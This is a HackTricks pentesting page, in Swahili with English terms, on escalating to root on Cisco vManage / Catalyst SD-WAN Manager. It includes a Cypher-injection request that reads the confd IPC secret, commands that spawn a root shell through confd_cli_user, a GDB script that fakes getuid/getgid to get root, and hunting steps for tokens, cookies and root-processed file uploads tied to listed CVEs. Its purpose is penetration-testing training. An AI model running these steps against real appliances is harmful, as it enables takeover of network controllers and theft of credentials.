# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Mara tu unapopata code execution kwenye Cisco vManage / *Catalyst SD-WAN Manager* kama `vmanage`, `netadmin`, au `vmanage-admin`, maeneo ya local privesc yanayovutia zaidi kwa kawaida ni `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs, na root-owned import/upload handlers.

Kama bado unahitaji **initial foothold** kwenye controller, angalia kwanza ukurasa maalum wa control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```
Ikiwa `/etc/confd/confd_ipc_secret` inaweza kusomwa kutoka kwenye foothold yako, Path 1 na Path 2 zinakuwa zinawezekana mara moja.

## Path 1

(Mfano kutoka [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Baada ya kuchimba kidogo kupitia baadhi ya [documentation](http://66.218.245.39/doc/html/rn03re18.html) inayohusiana na `confd` na binaries mbalimbali (zinazopatikana kwa account kwenye website ya Cisco), tuligundua kwamba ili kuthibitisha IPC socket, inatumia secret iliyoko katika `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Kumbuka instance yetu ya Neo4j? Inaendeshwa chini ya ruhusa za mtumiaji `vmanage`, hivyo kuturuhusu kupata faili kwa kutumia vulnerability ya awali:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Programu `confd_cli` haiungi mkondo wa amri lakini inaita `/usr/bin/confd_cli_user` na arguments. Kwa hiyo, tunaweza kuiita moja kwa moja `/usr/bin/confd_cli_user` na seti yetu wenyewe ya arguments. Hata hivyo haiwezi kusomwa kwa privileges zetu za sasa, hivyo lazima tui retrievi kutoka rootfs na kui-copy kwa kutumia scp, kusoma help, na kuitumia kupata shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Njia 2

(Mfano kutoka [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Blog¹ ya timu ya synacktiv ilieleza njia ya kifahari ya kupata root shell, lakini tahadhari ni kwamba inahitaji kupata nakala ya `/usr/bin/confd_cli_user` ambayo inaweza kusomwa tu na root. Nilipata njia nyingine ya kupandisha hadi root bila usumbufu huo.

Nilipodisasmbli binary ya `/usr/bin/confd_cli`, niliona yafuatayo:

<details>
<summary>Objdump showing UID/GID collection</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Nilipoendesha “ps aux”, niliona yafuatayo (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Nilikisia kwamba programu ya “confd_cli” hupitisha user ID na group ID ilizokusanya kutoka kwa user aliyeingia kwenda kwa application ya “cmdptywrapper”.

Jaribio langu la kwanza lilikuwa kuendesha “cmdptywrapper” moja kwa moja na kuipelekea `-g 0 -u 0`, lakini lilikataa. Inaonekana file descriptor (-i 1015) iliundwa mahali fulani njiani na siwezi kuiigiza.

Kama ilivyotajwa kwenye blog ya synacktiv(kwa mfano wa mwisho), programu ya “confd_cli” haitumii command line argument, lakini naweza kuiathiri kwa kutumia debugger na kwa bahati nzuri GDB imejumuishwa kwenye system.

Niliunda GDB script ambayo nililazimisha API `getuid` na `getgid` kurudisha 0. Kwa kuwa tayari nina privilege ya “vmanage” kupitia deserialization RCE, nina ruhusa ya kusoma `/etc/confd/confd_ipc_secret` moja kwa moja.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Console output</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Njia ya 3 (hitilafu ya uthibitishaji wa ingizo wa 2025 CLI - CVE-2025-20122)

Cisco baadaye ilirekodi njia safi zaidi ya local root katika advisory yake yenyewe kwa [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **mshambulizi aliyethibitishwa akiwa na ruhusa za read-only pekee** angeweza kutuma ombi lililotengenezwa maalum kwa manager CLI na kuruka hadi root kwa sababu ya ukosefu wa input validation ya kutosha.

Kwa mtazamo wa offensive, hiki ndicho cha muhimu kuchukua:

1. Mara tu unapokuwa na *foothold* yoyote ya low-priv kwenye box, unapaswa kupima local CLI service kabla ya kwenda kwenye workflow nzito ya Path 1 / Path 2.
2. Tumia tena artifacts kutoka Path 2 kupata trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Chukulia kila field inayosafirishwa kwenda kwenye CLI backend kama ya kutiliwa shaka: UID/GID, username, terminal metadata, imported files, au thamani yoyote inayotumika baadaye na helper inayomilikiwa na root.
4. Ikiwa low-priv user anaweza kufikia local CLI socket na kushawishi fields hizo, root inaweza kuwa ni ombi moja lililotengenezwa maalum tu mbali.

Workflow ya vitendo baada ya kutua kwenye appliance ni:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Hii inageuza mdudu wa 2025 kuwa muundo mzuri wa uwindaji kwa matoleo yanayofanana: tafuta **local CLI shims zinazokusanya identity kwenye userland na kuisambaza kwa wrapper yenye ruhusa zaidi**.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco's advisory ya Februari 2026 pia ilianzisha darasa lingine la privesc lenye manufaa: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) iliruhusu **authenticated, local attacker with low privileges** kupata root kwa sababu ya mechanism isiyo ya kutosha ya user-authentication kwenye REST API.

Hii ni muhimu kwa sababu vManage privesc haizuiliwi tena kwa matumizi mabaya ya `confd`/TTY pekee. Baada ya kupata low-priv shell, pia tafuta:

- localhost-only API endpoints zinazomwamini caller kupita kiasi
- tokens, cookies, au service credentials zinazosomeka kutoka kwenye account ya sasa
- root-only actions zilizo wazi kupitia `dataservice`/REST handlers ambazo bado zinaweza kuchochewa locally

Kwa vitendo, mara tu unapokuwa na shell kama `vmanage` au service user mwingine, matumizi mabaya ya local API mara nyingi ni ya kimya zaidi na rahisi kufanya automate kuliko matumizi mabaya ya interactive CLI:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Ikiwa muktadha wa session ya ndani unatosha kugonga utendaji wa privileged wa REST, chagua njia ya API: ni rahisi kuireplay, kui-script, na kui-chain pamoja na stolen web sessions au API tokens.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Mtindo mwingine wa karibuni ni [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): attacker wa ndani aliye na ruhusa za `netadmin` angeweza kupakia **crafted file** ambayo baadaye CLI iliishughulikia bila usalama, na kusababisha command injection kama `root`.

Kutoka kwa mtazamo wa HackTricks, technique yenye thamani ni pana zaidi kuliko CVE husika:

1. Orodhesha kila workflow ya CLI au web inayokubali file: imports, diagnostic bundles, templates, validators, backups, tenant data, n.k.
2. Fuatilia faili lililopakiwa linaishia wapi na ni root-owned script au binary gani hulitumia.
3. Jaribu kama filename, maudhui ya file, au parsed metadata hupelekwa kwenye shell commands, wrapper scripts, au helpers za `system()`-style.
4. Ikiwa tayari unaweza kufikia `netadmin` (valid creds, stolen session, au auth-bypass chain), bugs za file-processing mara nyingi ni njia ya haraka zaidi kwenda root.

Aina hii ya bug hu-chain vizuri hasa na remote footholds zinazoipa `netadmin` lakini si `root`.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Authenticated UI XSS (CVE-2024-20475)** – Iibiwe session ya admin katika web UI, kisha pivot kwenda kwenye API/CLI actions ambazo hatimaye hufikia `vshell` au mojawapo ya local privesc paths zilizo hapo juu.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Ni precursor yenye nguvu sana kwa Path 5 kwa sababu `netadmin` ndiyo level inayohitajika na 2026 crafted-file privesc.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Ni muhimu kwa kudondosha files ambazo baadaye huchakatwa na privileged components au kwa ku-overwrite operational artifacts zinazotumiwa na root-owned helpers.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Imefafanuliwa vizuri zaidi kwenye dedicated SD-WAN control-plane page; inaweza ku-append SSH key kwa `vmanage-admin`, na kukupa local foothold unaohitaji kurudi kwenye ukurasa huu.

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
